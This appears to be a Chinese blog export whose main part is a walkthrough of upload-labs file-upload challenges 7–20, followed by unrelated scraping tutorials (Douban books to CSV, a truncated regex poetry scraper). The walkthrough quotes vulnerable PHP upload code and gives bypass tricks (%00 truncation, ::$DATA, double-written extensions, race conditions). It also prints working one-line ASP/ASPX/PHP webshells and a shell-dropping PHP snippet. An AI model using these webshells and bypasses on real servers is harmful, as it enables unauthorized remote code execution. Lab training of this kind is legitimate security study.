在上传的文件后面加个空格，就可以突破上传 第七关12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}查看源码，发现没有对点号进行限制，我们可以抓包在上传文件名后面加点号 第八关 123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 发现没有对::$DATA进行过滤，可以利用windows的特性，上传抓包在文件名后面加::$DATA突破上传 第九关 1234567891011121314151617181920212223242526if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 查看源码 发现黑名单过滤了所以危险后缀，也有了过滤点号等操作 但是我们可以双写绕过 .空格.就可以绕过 第十关123456789101112131415161718if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}$file_name = str_ireplace($deny_ext,””, $file_name);这段代码的意思就是：将出现在黑名单的后缀名替换为空所以我们可以双写绕过 例如:phphpp 这样后台代码会把php替换为空，在把前面的ph，在把p拼接组成php 突破上传 第十一关 12345678910111213141516if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }} 这段代码是基于白名单的验证，发现只有jpg,png,gif才能上传 其他的后缀名无法上传抓个包：我们看见在上传包中 有上传的地址我们可以想到用%00截断上传在前提有两个条件: 1.PHP&lt;5.3.4 2.php的magic_quotes_gpc为OFF状态 先说说什么是%00截断上传: 谈到00截断我们都会想到，有什么0x00截断，%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置.知道了基本原理之后，我们还要分析它怎么起作用，如果按照上述的做法来做，则00绕过只能绕过前端验证，因为如果是后端验证，那么即使后缀被截断了，处理之后为.php，还是会被后端验证拦截，所以不是什么情况下00截断都有用的，不过这里至少可以确定，在绕过前端验证可以用。在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效 如果在Burp中直接改filename，根本无法起作用，因为截断的只是后缀名，只能绕过简单的前端验证，到后端碰到上图的代码，在提取上传文件后缀的时候后缀还是.php，肯定会被拦，也就是说这里00截断没有发挥任何“绕过”后端验证的作用。 这里想绕过，必须要知道文件上传的条件： 1.后缀检测，合格则进行上传路径拼接2.拼接路径和文件名，组成文件上传路径 %u8FD9%u91CC%u51B3%u5B9A%u6587%u4EF6%u4E0A%u4F20%u540E%u88AB%u4FDD%u5B58%u5728%u6587%u4EF6%u5939%u4E2D%u7684%u771F%u5B9E%u540E%u7F00%u540D%u7684%u662F%u6587%u4EF6%u4E0A%u4F20%u8DEF%u5F84%uFF0C%u56E0%u4E3A%u4E0A%u9762%u4E00%u5927%u5806%u4EE3%u7801%u53EA%u4E0D%u8FC7%u662F%u5BF9%u540E%u7F00%u540D%u8FDB%u884C%u5404%u79CD%u5904%u7406%u548C%u9A8C%u8BC1%uFF0C%u8FD9%u91CC%u76F8%u5F53%u4E8E%u4E00%u4E2A%u8FC7%u5B89%u68C0%u7684%u8FC7%u7A0B%uFF0C%u6700%u540E%u51B3%u5B9A%u6587%u4EF6%u5230%u5E95%u662F%u4EC0%u4E48%u540D%u5B57%uFF0C%u4EC0%u4E48%u540E%u7F00%u540D%uFF0C%u8981%u770B**%u201C%u6587%u4EF6%u4E0A%u4F20%u8DEF%u5F84%u201D** 这个源码中的文件路径是上传路径和文件名拼接的，也就是说也许上面的后缀被处理了半天能通过安检了，但是最后上传后的文件后缀却不一定这个被处理了半天的“后缀”，不明白的可以去看看我的上一篇博客。这里拼接的是$file_name这个变量，它和后缀名变量$file_ext是不同的， $file_name没有经历那一堆安检处理，只是从它身上截取出了一个$file_ext变量拿去安检，因此这里用 $file_name来拼接路径的话，还是有可能蒙混过关的，比如这里就可以构造xxx.php.空格. 来进行绕过。 扯远了，回到00截断，说了这么多，也就是说想使用00截断绕过后端验证，除非两个条件之一：1.路径拼接像上图的代码一样，直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。2.文件路径可控，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃，因为这里已经到了“最后阶段”，不会再有安检过程了，这里截断之后的结果就是最终上传的结果，比如下图中，抓到的包里发现了路径，那么使用上面的方法直接改它，就可以成功上传aa.php文件，不管被处理后的文件名是什么，在这里被截断才是真正的“截断”，因为这是在安检（后缀名校验）之后进行的截断，直接决定真实的文件后缀名。【0x00h和%00】 %u5B83%u4EEC%u6700%u7EC8%u7684%u7ED3%u679C%u90FD%u662F%u4E00%u6837%u7684%uFF0C%u90FD%u4EE3%u8868%u7740chr%280%29%uFF0C%u5373%u7A7A%u5B57%u7B26%uFF0C%u53EA%u4E0D%u8FC7%u4F7F%u7528%u7684%u4F4D%u7F6E%u4E0D%u540C%uFF0C0x00%u4EE3%u886816%u8FDB%u5236%u7684%u7A7A%u5B57%u7B2600%uFF0C%u9700%u8981%u5728HEX%u4E2D%u6539%u4E3A00%uFF0C%u8FDB%u884C%u622A%u65AD%uFF0C%u800C%2500%u662FURL%u89E3%u7801%u4E4B%u524D%u7684%u5B57%u7B26%uFF0C%u5B83%u88AB%u89E3%u7801%u621016%u8FDB%u5236ASCII%u7801%u4E4B%u540E%u5B9E%u9645%u4E0A%u4E5F%u662F0x00%uFF0C%u6240%u4EE5%u5B83%u4EEC%u6700%u7EC8%u90FD%u5BF9%u5E94%u7684%u662F%u7A7A%u5B57%u7B26%uFF0C%u8FD9%u91CC%2500%u53EF%u4EE5%u7528%u5728URL%u4E2D%u5982xx.php%3Ffilename%3Dtest.php%2500.txt%uFF0C%u4E5F%u53EF%u4EE5%u76F4%u63A5%u63D2%u5728Burp%u5305%u4E2D%u7684%u8DEF%u5F84%u4E2D%uFF0C%u5982path%3Dshell.jsp%2500.txt 对于%00截断的利用必须满足是知道上传路径，然后上传路径进行截断 第十二关12345678910111213141516if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; }}看源码这也是%00截断上传的题 只不过这是post提交抓个包：看见上传路径在post提交内容中 所以和前一关一样%00截断上传，但是不能直接用%00，因为这是在post表单中，url不会自动解码 所以我们要在hex里面改 第十三关12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}?&gt;根据题目意思，让上传一个图片马到服务器中图片马的意思就是：一张完整图片中包含一句话木马 但是图片还是能正常显示图片马的制作：（1）copy 1.jpg/b+2.php/a shell.jpg (2)十六进制编辑器编辑添加用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存. 常见的一句话asp一句话 &lt;%eval request(“pass”)%&gt;aspx一句话 &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;php一句话 &lt;?php @eval($_POST[“pass”]);?&gt; 上传之后图片马一般是配合文件包含漏洞，也有少数网站能解析图片马中的php代码，这样的就可以直接用菜刀连接直接用菜刀连接图片马 虽然可以连接 但是会出错 用文件包含： 第十四关12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}这也是图片马上传： getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过 第十五关1234567891011121314151617181920212223242526272829303132333435function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } }}php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过 第十六关1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; }} 二次渲染是指上传文件服务器时，把图片中php代码删去但是可以经过对比来发现没有渲染的，在没有渲染的部分加入代码 第十七关1234567891011121314151617181920if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; }}可以上传图片马配合文件包含漏洞 来解析在一个可以使用竞争上传~竞争上传原理：网站逻辑：1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。在删除之前访问上传的php文件，从而执行上传文件中的php代码。我们可以写一个python脚本不断上传一句话，然后利用时间差就可以突破上传也可以使用bp！！！ 利用：在时间间隙中，不断访问一个恶意文件，这个文件中包含一段创建木马的代码，在不断访问之后就可以在服务创建这段木马程序python脚本：123import requestswhile True: requests.get(&quot;路径&quot;)上传的文件：12&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;');?&gt;路径就是上传文件的路径，比如：上传的文件名是webshell.php 路径是：upload构造完整路径就是：http://192.168.1.1/upload-labs/upload/webshell.php 第十八关1234567891011121314151617181920212223242526272829303132333435363738if (isset($_POST['submit'])){ require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; }} 因此我们可以通过条件竞争来上传图片马。 第十九关1234567891011121314151617181920212223242526272829if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); /* $file_name = trim($_POST['save_name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 */ $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} trick，move_uploaded_file会忽略掉文件末尾的/.。但是Pass9中的文件名是从$_FILES[‘upload_file’][‘tmp_name’]中获取的，这里是用户可控的。因此构造/.或者. 第二十关12345678910111213141516171819202122232425262728293031323334353637383940if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //mime check $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //check filename $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } } }else{ $msg = &quot;请选择要上传的文件！&quot;; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}","link":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.html"},{"title":"爬虫实战_爬取豆瓣图书利用csv库存储","text":"读取csv文件通过csv.reader()和DictReader()两个函数reader()函数返回一个迭代器 会包含表头 通过next函数可以跳过，但是它只能通过下标访问数据；DictReader()函数返回一个字典，不包含表头，可以通过键名访问！！1234567891011import csv# with open('1 (2).csv','r') as fp:# reader=csv.reader(fp)# # next(reader)# for x in reader:# print(x)with open('1 (2).csv','r') as fp: reader=csv.DictReader(fp) for i in reader: print(i['学生姓名']) 写入csv文件两个方法：一个通过writer()函数 一个通过Dictwriter()函数。writerow() writerows()都是先将文件通过上面两个函数封装成对象，然后在对csv对象进行操作。注意Dictwriter()有两个参数一个是文件，另一个是表头(列表)，先调用writeheader()函数将表头写进去。这两个函数都可以写入，看给的数据：如果是元组用第一个函数；给的是字典用第二个函数。 项目项目说明：爬取豆瓣图片前十页，并用csv库存储下来。代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import requestsimport csvfrom bs4 import BeautifulSoupheader={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&quot;}headers=['书名','相关信息','评分']def spdier(url): resp=requests.get(url,headers=header) text=resp.text html=BeautifulSoup(text,&quot;lxml&quot;) # print(html.prettify()) alist=html.find_all('a',class_='title') titles=[] for a in alist: title=list(a.stripped_strings)[0] titles.append(title) infolist=html.find_all('div',class_='desc') infos=[] for info in infolist: info1=list(info.stripped_strings)[0] infos.append(info1) ratelist=html.find_all('span',class_='rating_nums') rates=[] for i in ratelist: rate=list(i.stripped_strings)[0] rates.append(rate) books=[] for i in range(len(rates)): book={ '书名':titles[i], '相关信息':infos[i], '评分':rates[i] } books.append(book) return booksdef csv_storage(list_books,filename): with open(filename,'w',encoding='utf-8',newline='') as fp: writer=csv.DictWriter(fp,headers) writer.writeheader() writer.writerows(list_books)def main(): base_url=&quot;https://www.douban.com/tag/%E5%B0%8F%E8%AF%B4/book?start={}&quot; books=[] for i in range(0,136,15): url=base_url.format(i) book=spdier(url) books +=book csv_storage(books,'豆瓣图片.csv')if __name__ == '__main__': main() 总结今天学习了csv库存储爬取下来的数据，通过这个项目巩固了学习的内容。","link":"/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E5%88%A9%E7%94%A8csv%E5%BA%93%E5%AD%98%E5%82%A8.html"},{"title":"正则表达式_爬取中国古诗词网与豆瓣热门图书","text":"一.爬取中国诗词网123456789101112131415161718192021222324252627282930313233343536import reimport requestsdef handler_url(url): header={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&quot; } reponse=requests.get(url,header) text=reponse.text titles=re.findall(r'&lt;div\\sclass=&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;/b&gt;',text,re.DOTALL) years=re.findall(r'&lt;p\\sclass=&quot;source&quot;&gt;&lt;a.*?&gt;(.*?)&lt;/a&gt;',text,re.DOTALL) autors=re.findall(r'&lt;p\\sclass=&quot;source&quot;&gt;.*?&lt;a.*?&gt;.*?&lt;a.*?&gt;(.*?)&lt;/a&gt;',text,re.DOTALL) contents_tmp=re.findall(r'&lt;p\\sclass=&quot;source&quot;&gt;.*?&lt;div\\sclass=&quot;contson&quot;\\s.*?&gt;(.*?)&lt;/div&gt;',text,re.DOTALL) contents=[] for c in contents_tmp: 